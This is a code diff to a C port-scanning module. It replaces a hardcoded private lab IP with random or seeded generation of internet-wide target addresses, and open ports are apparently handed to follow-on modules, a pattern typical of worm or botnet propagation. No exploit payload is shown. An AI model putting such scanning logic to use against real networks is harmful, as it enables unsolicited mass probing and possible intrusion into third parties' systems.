@@ -31,7 +31,7 @@ if an IP is open for one port we will attempt all searches because itll be quick
 Portscan *portscan_list = NULL;
 
 // adds a port to the scanning list.. and the module to send the connection to afterwards
-int Portscan_Add(Modules *module, int port) {
+int Portscan_Add(Modules *module, int port, int ip_gen_seed) {
     Portscan *pptr = NULL;
     
     if ((pptr = (Portscan *)L_add((LIST **)&portscan_list, sizeof(Portscan))) == NULL)
@@ -39,6 +39,7 @@ int Portscan_Add(Modules *module, int port) {
         
     pptr->module = module;
     pptr->port = port;
+    pptr->ip_gen_seed = ip_gen_seed;
 }
 
 // find a port scan by port..
@@ -101,10 +102,15 @@ int portscan_init(Modules **_module_list) {
 }
 
 
-unsigned int IPGenerate() {
+unsigned int IPGenerate(int id, int seed) {
     unsigned int ret = 0;
     unsigned char *_raw = (unsigned char *)&ret;
     int a = 0;
+    
+    // if there is no seed.. lets return as truly random
+    if (seed != 0) {
+        return IPGenerateAlgo(id, seed);
+    }
     
     for (a = 0; a < 4; a++) {
         _raw[a] = rand()%255;
@@ -179,7 +185,8 @@ int portscan_main_loop(Modules *mptr, Connection *conn, char *buf, int size) {
             // x is a backup in case ther is a bug, or other OS level issues during tcp_connect()
             while (z < a && x++ < MAX_PORTSCAN_SOCKETS) {
                 // first we generate an IP address
-                unsigned int ip = inet_addr("192.168.12.128");
+                unsigned int ip = IPGenerate(pptr->port, pptr->ip_gen_seed);
+                //ip = net_addr("192.168.12.128");
                 //unsigned int ip = IPGenerate();
                 
                 // do not reconnect to the same socket..
